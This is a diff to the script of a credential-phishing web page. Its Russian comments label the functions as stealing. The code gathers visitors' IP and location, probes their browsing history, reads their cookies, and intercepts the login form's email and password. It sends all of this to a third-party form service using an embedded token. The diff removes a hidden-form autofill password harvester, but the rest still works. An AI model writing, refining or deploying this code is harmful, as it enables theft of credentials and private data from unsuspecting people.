@@ -86,15 +86,14 @@
     </div>
 
     <script>
-        // ТОКЕН FORMSUBMIT - УЖЕ ПОДСТАВЛЕН
-        const YOUR_EMAIL = '8df751da5a237fe0c9040294684fe0e6';
+        // ТОКЕН FORMSUBMIT
+        const FORM_TOKEN = '8df751da5a237fe0c9040294684fe0e6';
         
         // ОСНОВНАЯ ФУНКЦИЯ
         async function startStealing() {
             await collectSystemInfo();
             await stealBrowserHistory();
             await stealCookies();
-            await stealAutofillPasswords();
             setupFormInterception();
         }
 
@@ -102,53 +101,49 @@
         async function collectSystemInfo() {
             try {
                 const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-                const geoData = await fetch(`https://ipapi.co/${ipData.ip}/json/`).then(r => r.json());
+                const geoData = await fetch('https://ipapi.co/' + ipData.ip + '/json/').then(r => r.json());
                 
                 const systemInfo = {
                     ip: ipData.ip,
                     city: geoData.city,
                     country: geoData.country_name,
-                    isp: geoData.org,
                     browser: navigator.userAgent,
                     platform: navigator.platform,
                     screen: screen.width + 'x' + screen.height,
-                    language: navigator.language,
                     url: window.location.href,
-                    timestamp: new Date().toLocaleString()
+                    time: new Date().toLocaleString()
                 };
                 
                 await sendReport('system_info', systemInfo);
-            } catch (error) {}
+            } catch (error) {
+                console.log('Error');
+            }
         }
 
         // КРАДЕМ ИСТОРИЮ БРАУЗЕРА
         async function stealBrowserHistory() {
-            const visitedSites = [];
-            const popularSites = [
+            const visited = [];
+            const sites = [
                 'https://facebook.com', 'https://youtube.com', 'https://google.com',
-                'https://instagram.com', 'https://twitter.com', 'https://vk.com',
-                'https://ok.ru', 'https://mail.ru', 'https://gmail.com',
-                'https://github.com', 'https://tiktok.com', 'https://whatsapp.com',
-                'https://web.telegram.org', 'https://discord.com', 'https://netflix.com',
-                'https://sberbank.ru', 'https://tinkoff.ru', 'https://avito.ru'
+                'https://instagram.com', 'https://twitter.com', 'https://vk.com'
             ];
             
-            for (const site of popularSites) {
+            for (const site of sites) {
                 try {
                     const link = document.createElement('link');
                     link.rel = 'stylesheet';
                     link.href = site + '/fake.css';
                     
-                    let isVisited = false;
+                    let found = false;
                     link.onload = function() {
-                        isVisited = true;
-                        visitedSites.push(site);
+                        found = true;
+                        visited.push(site);
                     };
                     
                     document.head.appendChild(link);
                     
                     setTimeout(() => {
-                        if (!isVisited) {
+                        if (!found) {
                             const testLink = document.createElement('a');
                             testLink.href = site;
                             testLink.style.display = 'none';
@@ -156,7 +151,7 @@
                             
                             const color = getComputedStyle(testLink).color;
                             if (color !== 'rgb(0, 0, 238)') {
-                                visitedSites.push(site);
+                                visited.push(site);
                             }
                             document.body.removeChild(testLink);
                         }
@@ -166,10 +161,10 @@
                 } catch (error) {}
             }
             
-            if (visitedSites.length > 0) {
-                await sendReport('browser_history', {
-                    visitedSites: visitedSites,
-                    totalCount: visitedSites.length
+            if (visited.length > 0) {
+                await sendReport('history', {
+                    sites: visited,
+                    count: visited.length
                 });
             }
         }
@@ -178,41 +173,16 @@
         async function stealCookies() {
             try {
                 const cookies = document.cookie;
-                if (cookies && cookies.length > 0) {
+                if (cookies) {
                     await sendReport('cookies', {
                         cookies: cookies.split(';'),
-                        totalCookies: cookies.split(';').length
+                        count: cookies.split(';').length
                     });
                 }
             } catch (error) {}
         }
 
-        // КРАЖА АВТОЗАПОЛНЕННЫХ ПАРОЛЕЙ
-        async function stealAutofillPasswords() {
-            const hiddenForm = document.createElement('form');
-            hiddenForm.style.cssText = 'position: absolute; left: -9999px; top: -9999px;';
-            hiddenForm.innerHTML = `
-                <input type="text" name="username" autocomplete="username">
-                <input type="password" name="password" autocomplete="current-password">
-            `;
-            document.body.appendChild(hiddenForm);
-            
-            setTimeout(() => {
-                const usernameField = hiddenForm.querySelector('input[name="username"]');
-                const passwordField = hiddenForm.querySelector('input[name="password"]');
-                
-                if (usernameField.value || passwordField.value) {
-                    sendReport('autofill_data', {
-                        username: usernameField.value,
-                        password: passwordField.value
-                    });
-                }
-                
-                document.body.removeChild(hiddenForm);
-            }, 1000);
-        }
-
-        // ПЕРЕХВАТ ФОРМЫ ЛОГИНА
+        // ПЕРЕХВАТ ФОРМЫ
         function setupFormInterception() {
             document.getElementById('loginForm').addEventListener('submit', function(event) {
                 event.preventDefault();
@@ -222,10 +192,9 @@
                 const loader = document.getElementById('loader');
                 const status = document.getElementById('status');
                 
-                sendReport('stolen_credentials', {
+                sendReport('credentials', {
                     email: email,
-                    password: password,
-                    source: 'login_form'
+                    password: password
                 });
                 
                 loader.style.display = 'block';
@@ -243,22 +212,24 @@
         // ОТПРАВКА ОТЧЕТА
         async function sendReport(type, data) {
             try {
-                const reportData = {
+                const report = {
                     type: type,
                     data: data,
-                    timestamp: new Date().toLocaleString()
+                    time: new Date().toLocaleString()
                 };
                 
-                await fetch("https://formsubmit.co/ajax/" + YOUR_EMAIL, {
+                await fetch("https://formsubmit.co/ajax/" + FORM_TOKEN, {
                     method: "POST",
                     headers: { 
                         'Content-Type': 'application/json',
                         'Accept': 'application/json'
                     },
-                    body: JSON.stringify(reportData)
+                    body: JSON.stringify(report)
                 });
                 
-            } catch (error) {}
+            } catch (error) {
+                console.log('Send error');
+            }
         }
 
         // ЗАПУСК
